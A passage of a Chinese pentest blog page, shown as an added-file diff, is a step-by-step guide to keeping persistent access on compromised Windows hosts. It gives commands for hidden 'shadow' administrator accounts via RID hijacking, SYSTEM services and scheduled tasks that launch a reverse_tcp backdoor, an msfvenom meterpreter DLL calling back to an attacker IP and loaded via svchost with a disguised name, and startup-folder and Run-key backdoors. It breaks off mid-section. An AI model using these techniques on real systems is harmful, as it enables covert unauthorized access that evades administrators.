@@ -1,0 +1,478 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网权限持久化 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="内网权限持久化当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致对服务器权限的丢失，测试人员往往需要采取一些手段来实现对目标服务器的持久化访问。权限持久化（Persistence，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问的技术，如创建系统服务、利用计划任务、滥用系统启动项或注册表、映像劫持、替换或劫持合法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网权限持久化">
+<meta property="og:url" content="http://example.com/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="内网权限持久化当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致对服务器权限的丢失，测试人员往往需要采取一些手段来实现对目标服务器的持久化访问。权限持久化（Persistence，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问的技术，如创建系统服务、利用计划任务、滥用系统启动项或注册表、映像劫持、替换或劫持合法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.bimg.cc/random">
+<meta property="article:published_time" content="2024-03-07T13:00:12.000Z">
+<meta property="article:modified_time" content="2024-03-07T12:46:04.301Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网权限持久化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-07 20:46:04'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网权限持久化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-07T13:00:12.000Z" title="发表于 2024-03-07 21:00:12">2024-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-07T12:46:04.301Z" title="更新于 2024-03-07 20:46:04">2024-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/">内网渗透体系建设</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网权限持久化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h1 id="内网权限持久化"><a href="#内网权限持久化" class="headerlink" title="内网权限持久化"></a>内网权限持久化</h1><p>当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致对服务器权限的丢失，测试人员往往需要采取一些手段来实现对目标服务器的持久化访问。<br>权限持久化<br>（<strong>Persistence</strong>，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问的技术，如创建系统服务、利用计划任务、滥用系统启动项或注册表、映像劫持、替换或劫持合法代码等。</p>
+<h2 id="常见系统后门技术"><a href="#常见系统后门技术" class="headerlink" title="常见系统后门技术"></a>常见系统后门技术</h2><h3 id="1-创建影子账户"><a href="#1-创建影子账户" class="headerlink" title="1.创建影子账户"></a>1.创建影子账户</h3><p><strong>影子账户</strong>，顾名思义，就是隐藏的账户，无论通过“计算机管理”还是命令行查询都无法看到，只能在注册表中找到其信息。测试人员常常通过创建具有管理员权限的影子账户，在目标主机上实现权限维持，不过需要拥有管理员级别的权限。<br>通过创建影子账户，测试人员可以随时随地通过远程桌面或其他方法登录目标系统，并执行管理员权限的操作。下面笔者演示创建影子账户的步骤。</p>
+<ol>
+<li><p>在目标主机中输入以下命令，创建一个名为<code>Hacker$</code>的账户。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Hacker$Hacker@123 /add           #创建隐藏账户Hacker$</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108202932313.png" class="" title="image-20240108202932313">`$`符号表示该用户为隐藏账户，创建的用户无法通过命令行查询到。
+<p>但是，在“<strong>控制面板</strong>”和“<strong>计算机管理</strong>”的“<strong>本地用户和组</strong>”中仍然可以看到该用户，如图。并且此时<code>Hacker$</code>仍然为标准用户，为了使其拥有管理员级别的权限，还需要修改注册表。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108204352071.png" class="" title="image-20240108204352071">
+</li>
+<li><p>在注册表编辑器中定位到<code>HKEY LOCAL MACHINE\SAMISAM</code>，单击右键，在弹出的快捷菜单中选择“权限”命令，将<strong>Administrator</strong>用户的权限设置为“完全控制”，如图6-1-3所示。因为该注册表项的内容在标准用户和管理员权限下都是不可见的。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108205127170.png" alt="image-20240108205127170" style="zoom:80%;">
+</li>
+<li><p>在注册表项<code>HKEY_LOCAL MACHINE\SAM\SAMDomains\Account\Users\Names</code>处选择<strong>Administrator</strong>用户，在左侧找到与右边显示的键值的类型“<strong>Oxlf4</strong>”相同的目录名，即图中箭头所指的“<strong>000001F4</strong>”。</p>
+<p>复制<strong>000001F4</strong>表项的F属性的值，如图6-1-5所示。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108205729942.png" alt="image-20240108205729942" style="zoom: 67%;">
+</li>
+<li><p>以相同方法找到与隐藏账户<strong>Hacker$<strong>相应的目录</strong>000003EA</strong>，将复制的<strong>000001F4</strong>表项中的F属性值粘贴到<strong>000003EA</strong>表项中的<strong>F</strong>属性值处<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108205610139.png" alt="image-20240108205610139" style="zoom: 67%;"></p>
+<p>以上过程其实是<code>Hacker$</code>用户劫持了<strong>Administrator</strong>用户的<strong>RID</strong>，从而使<code>Hacker$</code>用户获得<strong>Administrator</strong>用户的权限。</p>
+</li>
+<li><p>分别选中注册表项<strong>Hacker</strong>$和<strong>000003EA</strong>并导出</p>
+<p>执行以下命令删除**Hakcer$**用户：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Hacker$ /del</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108210233774.png" class="" title="image-20240108210233774">
+</li>
+<li><p>将刚才导出的两个注册表项导入注册表中即可</p>
+</li>
+</ol>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108210419250.png" alt="image-20240108210419250" style="zoom: 67%;">
+
+<p>到此，真正的影子账户Hacker$就创建好了。此时无论是查看“本地用户和组”还是通过命令行查询都看不到该账户，只在注册表中才能看该账户的信息</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108210526308.png" alt="image-20240108210526308" style="zoom:67%;">
+
+
+
+<h3 id="2-系统任务后门"><a href="#2-系统任务后门" class="headerlink" title="2.系统任务后门"></a>2.系统任务后门</h3><p>对于启动类型为“<strong>自动</strong>”的系统服务，测试人员可以将服务运行的二进制文件路径设置为后门程序或其他攻击载荷，当系统或服务重启时，可以重新获取对目标主机的控制权。不过，测试人员需要拥有目标主机的管理员权限。</p>
+<h4 id="1-创建系统服务"><a href="#1-创建系统服务" class="headerlink" title="1.创建系统服务"></a>1.创建系统服务</h4><p>执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc create Backdoor binpath="cmd.exe /k C:\Windows\System32\reverse_tcp.exe" start=</span><br><span class="line">"auto" obj= "LocalSystem"</span><br><span class="line"># binpath，指定服务的二进制文件路径，注意 "=" 后必须有一个空格</span><br><span class="line"># start，指定启动类型；obj，指定服务运行的权限</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在目标主机上创建一个名为<strong>Backdoor</strong>的系统服务，启动类型为“自动”，启动权限为<strong>SYSTEM</strong></p>
+<p>当系统或服务重启时，将以<strong>SYSTEM</strong>权限运行后门程序<strong>reverse_tcp.exe</strong>，目标主机将重新上线</p>
+<h4 id="2-利用现有的系统服务"><a href="#2-利用现有的系统服务" class="headerlink" title="2.利用现有的系统服务"></a>2.利用现有的系统服务</h4><p>通过修改现有服务的配置信息，使服务启动时运行指定的后门程序。测试人员可以通过<code>sc config</code>命令修改服务的<strong>binpath</strong>选项，也可以尝试修改服务注册表的<strong>ImagePath</strong>键，二者都直接指定了相应服务的启动时运行的二进制文件。相关利用方法见第4章的相关内容，不再赘述。</p>
+<h4 id="3-利用svchost-exe启动服务"><a href="#3-利用svchost-exe启动服务" class="headerlink" title="3.利用svchost.exe启动服务"></a>3.利用svchost.exe启动服务</h4><p><strong>svchost.exe</strong>是<strong>Windows</strong>的系统文件，官方解释：<strong>svchost.exe</strong>是从动态链接库（DLL）中运行的服务的通用主机进程名称。该程序本身只是作为服务的宿主，许多系统服务通过注入该程序进程中启动，所以系统中会存在多个该程序的进程。<br>在<strong>Windows</strong>系统中，需要由<strong>svchost.exe</strong>进程启动的服务将以<strong>DLL</strong>形式实现。在安装这些服务时，需要将服务的可执行文件路径指向<strong>svchost.exe</strong>。在启动这些服务时，由<strong>svchost..exe</strong>调用相应服务的DLL文件，而具体调用哪个<strong>DLL</strong>是由该服务在注册表的信息所决定的。<br>下面以<strong>wuauserv</strong>服务（<strong>Windows Update</strong>）为例进行讲解。在注册表中找到<strong>wuauserv</strong>服务，如图6-l-11所示。从imagepath键值可以得知，该服务启动的可执行文件的路径为<code>C:Windows\system32\svchost.exe-k netsvcs</code>，说明该服务是依靠<strong>svchost.exe</strong>加载<strong>DLL</strong>文件来实现的。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108214348990.png" class="" title="image-20240108214348990">
+
+<p><strong>wuauserv</strong>服务的注册表下还有一个<strong>Parameters</strong>子项，其中的<strong>ServiceDll</strong>键值表明该服务由哪个DLL文件负责。当服务启动时，<strong>svchost.exe</strong>就会加载<strong>wuaueng.dll</strong>文件，并执行其提供的具体服务。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108214533189.png" class="" title="image-20240108214533189">
+
+<p>注意，系统会根据服务可执行文件路径中的参数对服务进行分组，如<code>C:Windows system32\svchost.exe -k netsvcs</code>表明该服务属于<strong>netsvcs</strong>这个服务组。通常，每个<strong>svchost</strong>进程负责运行一组服务。因此，并不是每启动一个服务就会增加一个<strong>svchost.exe</strong>进程。<br><strong>svchost.exe</strong>的所有服务分组位于注册表的<code>HKEY_LOCAL MACHINE\SOFTWARE Microsoft\Windows NT\Current Version\Svchost</code>中。通过<strong>svchost.exe</strong>加载启动的服务都要在该表项中注册。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240108221858827.png" alt="image-20240108221858827" style="zoom: 67%;">
+
+<p>在实战中，测试人员可以通过<strong>svchost.exe</strong>加载恶意服务，以此建立持久化后门。由于恶意服务的<strong>DLL</strong>将加载到<strong>svchost.exe</strong>进程，恶意进程不是独立运行的，因此使用这种方法建立的后门具有很高的隐蔽性。 </p>
+<ol>
+<li><p>制作一个负责提供恶意服务的<strong>DLL</strong>文件。下面直接使用<strong>Metasploit</strong>生成<strong>DLL</strong>。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f dll -o reverse_tcp.dll</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240109100050185.png" alt="image-20240109100050185" style="zoom: 80%;">
+</li>
+<li><p>将生成的DLL文件上传到目标主机<strong>System32</strong>目录依次执行以下命令，安装并配置恶意服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 创建名为Backdoor的服务，并以svchost加载的方式启动，服务分组为netsvc</span><br><span class="line">sc create Backdoor binPath="C:\Windows\System32\svchost.exe -k netsvc" start= auto obj= LocalSystem</span><br><span class="line"># 将Backdoor服务启动时加载的DLL为reverse_tcp.dll </span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\System32\reverse_tcp.dll"</span><br><span class="line"># 配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d "Windows xxx Service"</span><br><span class="line"># 配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t  REG_SZ /d "Backdoor"</span><br><span class="line"># 创建服务新分组netsvc，并将Backdoor服务添加进去</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows NT\Currentversion\Svchost" /v netsvc /t REG_MULTI_SZ /d Backdoor</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+<p>当系统重启时，<strong>Svchost</strong>以<strong>SYSTEM</strong>权限加载恶意服务，目标主机将重新上线</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240109104229601.png" class="" title="image-20240109104229601">
+
+<h3 id="3-计划任务后门"><a href="#3-计划任务后门" class="headerlink" title="3.计划任务后门"></a>3.计划任务后门</h3><p>通过创建计划任务，让目标主机在特定的时间点或规定的周期内重复运行测试人员预先准备的后门程序，从而实现权限持久化。执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /sc daily /ST 08:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在目标主机上创建一个名为<strong>Backdoor</strong>的计划任务，并在每天08:00时以<strong>SYSTEM</strong>权限运行一次后门程序<strong>reverse_tcp.exe</strong></p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240109120420994.png" alt="image-20240109120420994" style="zoom:80%;">
+
+<p>注意，如果以<strong>SYSTEM</strong>权限运行计划任务，就需要拥有管理员级别的权限。<br>执行以下命令，创建一个名为<strong>Backdoor</strong>的计划任务，每60秒运行一次后门程序。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /SC minute /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当计划任务触发后，目标主机将重新上线。注意，在“计算机管理”中有“计划任务程序库”，其中存储了计算机上所有的计划任务</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240109120706341.png" alt="image-20240109120706341" style="zoom:80%;">
+
+<p>可以看到，计划任务在“计划任务程序库”中以类似文件目录的形式存储，所有计划任务都存储在最内层的目录中。因此，为了增强隐蔽性，建议在创建计划任务后门时遵守这个存储规范。<br>执行以下命令:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将在<code>Microsoft\Windows\AppTask\</code>路径下创建一个名为“<strong>AppRun</strong>”的计划任务后门</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240109121045809.png" alt="image-20240109121045809" style="zoom:80%;">
+
+
+
+<h3 id="4-启动项-注册表键后门"><a href="#4-启动项-注册表键后门" class="headerlink" title="4.启动项/注册表键后门"></a>4.启动项/注册表键后门</h3><p>测试人员可以通过将后门程序添加到系统启动文件夹或通过注册表运行键引用来进行权限持久化。添加的后门程序将在用户登录的上下文中启动，并且将具有与账户相关联的权限等级。</p>
+<h4 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a>1.系统启动文件夹</h4><p>将程序放置在启动文件夹中会导致该程序在用户登录时执行。<strong>Windows</strong>系统有两种常见的启动文件夹，如下所示：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 位于以下目录中的程序将在指定用户登录时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">#位于以下目录中的程序将在所有用户登录时启动</span><br><span class="line">C:\ProgramData\Microsoft\windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中，第一个文件夹中的程序仅在指定用户登录时启动，第二个文件夹是整个系统范围的启动文件夹，无论哪个用户账户登录，都将检查并启动该文件夹中的程序。</p>
+<h4 id="2-运行键（Run-Keys）"><a href="#2-运行键（Run-Keys）" class="headerlink" title="2.运行键（Run Keys）"></a>2.运行键（Run Keys）</h4><p><strong>Windows</strong>系统上有许多注册表项可以用来设置在系统启动或用户登录时运行指定的程序或加载指定<strong>DLL</strong>文件，测试人员可以对此类注册表进行滥用，以建立持久化后门。<br>当用户登录时，系统会依次检查位于注册表运行键（<strong>Run Keys</strong>）中的程序，并在用户登录的上下文中启动。<strong>Windows</strong>系统默认创建以下运行键，如果修改<strong>HKEY_LOCAL MACHINE</strong>下的运行键，需要拥有管理员级别的权限。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 以下注册表项中的程序将在当前用户登录时启动HKEY_CURRENT_USER\Software\Microsoft\Windows\Currentversion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\Currentversion\RunOnce</span><br><span class="line"># 以下注册表中的程序将在所有用户登录时启动HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\RunOnce</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行以下命令，在注册表运行键中添加一个名为“<strong>Backdoor</strong>”的键，并将键值指向后门程序的绝对路径。</p>
